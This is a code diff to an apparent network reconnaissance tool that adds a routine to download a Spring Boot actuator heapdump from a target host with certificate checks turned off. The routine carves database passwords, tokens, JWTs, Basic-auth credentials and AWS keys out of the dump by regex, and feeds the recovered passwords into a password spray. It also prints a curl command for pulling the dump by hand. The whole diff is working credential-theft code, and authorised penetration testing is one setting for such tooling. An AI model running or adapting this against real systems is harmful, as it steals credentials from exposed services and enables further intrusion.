@@ -15,14 +15,38 @@ Pure stdlib; runs as part of the web enrichment pass.
 
 from __future__ import annotations
 
+import base64
 import json
+import os
 import re
+import ssl
+import tempfile
+import urllib.request
 import concurrent.futures
 from typing import Optional
 
 from ...core import utils
 from ...core.report import HostReport, Finding
 from ...data import knowledge
+
+# Credential shapes worth carving out of a Spring Boot heapdump (JDumpSpider
+# style): JDBC URLs, password key=value pairs, HTTP Basic, JWTs, cloud keys.
+# Heapdump strings are null/control-byte delimited, so value classes exclude
+# \x00-\x1f (and quotes/brackets) to stop a match running across a boundary.
+_V = r"[^\s\"'<>,;{}\x00-\x1f]"
+_HEAP_PATS = [
+    ("JDBC URL", re.compile(rf"jdbc:[a-z0-9]+://{_V}{{4,200}}", re.I)),
+    ("password", re.compile(
+        r"(?i)(?:password|passwd|pwd|spring\.datasource\.password|"
+        r"spring\.mail\.password)[\"'=:]{1,3}(" + _V + r"{4,64})")),
+    ("secret/token", re.compile(
+        r"(?i)(?:secret|api[_-]?key|access[_-]?token|jwt[_-]?secret)"
+        r"[\"'=:]{1,3}(" + _V + r"{8,80})")),
+    ("HTTP Basic", re.compile(r"(?i)authorization:\s*basic\s+([A-Za-z0-9+/=]{8,})")),
+    ("JWT", re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")),
+    ("AWS key", re.compile(r"AKIA[0-9A-Z]{16}")),
+]
+_HEAP_MAX = 400 * 1024 * 1024   # don't pull more than 400 MB
 
 _ACTUATORS = ["actuator", "actuator/env", "actuator/health", "actuator/mappings",
               "actuator/configprops", "actuator/heapdump", "actuator/beans",
@@ -37,7 +61,7 @@ _SECRET_KEYS = re.compile(
 
 
 def probe(host: HostReport, port: int, secure: bool, vhost: Optional[str] = None,
-          fetch=None) -> None:
+          fetch=None, opts=None) -> None:
     """*fetch* is http._fetch (injected to reuse the no-redirect opener)."""
     if fetch is None:
         from .http import _fetch as fetch
@@ -67,6 +91,8 @@ def probe(host: HostReport, port: int, secure: bool, vhost: Optional[str] = None
                 continue
             seen_actuator.add(path)
             _actuator(host, port, path, base, body, pfx, vhost)
+            if path == "actuator/heapdump":
+                _loot_heapdump(host, f"{base}/{path}", vhost, port, pfx)
         elif path in _API_DOCS:
             _apidoc(host, port, path, base, body, low, pfx)
         elif path in _DEBUG and ("werkzeug" in low or "traceback" in low
@@ -155,6 +181,116 @@ def _actuator(host, port, path, base, body, pfx, vhost) -> None:
                 host.add_cred(val)
     for _lbl, val, _sev in knowledge.extract_secrets(body):
         host.add_cred(val)
+
+
+def _loot_heapdump(host, url, vhost, port, pfx) -> None:
+    """Download the heapdump and carve credentials out of it — the actuator's
+    biggest payoff (a live memory dump holds DB passwords, tokens, session
+    cookies). Streamed to a temp file with a size cap, scanned in chunks."""
+    utils.log("info", f"downloading heapdump {url} (may be large) — carving creds",
+              indent=2)
+    tmp = None
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        req = urllib.request.Request(url, headers={"User-Agent": "scryer"})
+        if vhost:
+            req.add_header("Host", vhost)
+        with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
+            tmp = tempfile.NamedTemporaryFile(prefix="scryer_heap_", delete=False)
+            total = 0
+            while total < _HEAP_MAX:
+                chunk = resp.read(4 * 1024 * 1024)
+                if not chunk:
+                    break
+                tmp.write(chunk)
+                total += len(chunk)
+            tmp.close()
+    except Exception as exc:
+        if tmp:
+            _rm(tmp.name)
+        utils.log("dim", f"heapdump download failed ({str(exc)[:60]}) — pull it "
+                         f"manually: curl -sk {url} -o heap.hprof; then "
+                         "JDumpSpider / strings", indent=3)
+        return
+
+    found = _carve_heapdump(tmp.name)
+    _rm(tmp.name)
+    if not found:
+        utils.log("dim", "no credentials carved from heapdump — open it in "
+                         "Eclipse MAT / JDumpSpider for a deeper look", indent=3)
+        return
+    for label, value in found:
+        utils.log("hot", f"heapdump {label}: {value[:60]}", indent=3)
+        host.add(Finding(
+            title=f"{pfx}Credential in heapdump: {label}",
+            detail=f"{value[:120]} (carved from /actuator/heapdump memory dump)",
+            severity="critical", category="cred", port=port, service="http",
+            evidence=value))
+        host.add_cred(_password_part(value))
+
+
+def _carve_heapdump(path):
+    """Chunk-scan a (possibly huge) heapdump for credential-shaped strings."""
+    found, seen = [], set()
+    try:
+        size = os.path.getsize(path)
+    except OSError:
+        return found
+    with open(path, "rb") as fh:
+        carry = b""
+        read = 0
+        while read < size:
+            block = fh.read(4 * 1024 * 1024)
+            if not block:
+                break
+            read += len(block)
+            text = (carry + block).decode("latin-1", "replace")
+            for label, pat in _HEAP_PATS:
+                for m in pat.finditer(text):
+                    val = (m.group(1) if m.groups() else m.group(0)).strip()
+                    if label == "HTTP Basic":
+                        try:
+                            val = base64.b64decode(val).decode("latin-1")
+                        except Exception:
+                            continue
+                    if not val or val in seen or _heap_junk(val):
+                        continue
+                    seen.add(val)
+                    found.append((label, val))
+                    if len(found) >= 60:
+                        return found
+            carry = block[-256:]      # overlap so a split match still lands
+    return found
+
+
+def _heap_junk(v: str) -> bool:
+    if len(v) < 4:
+        return True
+    low = v.lower()
+    if low in ("password", "null", "true", "false", "class", "string", "object"):
+        return True
+    # class/type names and getter/setter fragments, not secrets
+    return v.startswith(("java.", "org.springframework", "com.", "sun.", "[")) \
+        or v.endswith((";", "()", ".class"))
+
+
+def _password_part(value: str) -> str:
+    """For a jdbc/basic value, return just the password so it feeds the spray."""
+    m = re.search(r"://[^:/@\s]+:([^@\s/]+)@", value)      # jdbc://user:pass@
+    if m:
+        return m.group(1)
+    if ":" in value and value.count(":") == 1 and " " not in value:
+        return value.split(":", 1)[1]                     # user:pass (basic)
+    return value
+
+
+def _rm(path: str) -> None:
+    try:
+        os.unlink(path)
+    except OSError:
+        pass
 
 
 def _apidoc(host, port, path, base, body, low, pfx) -> None:
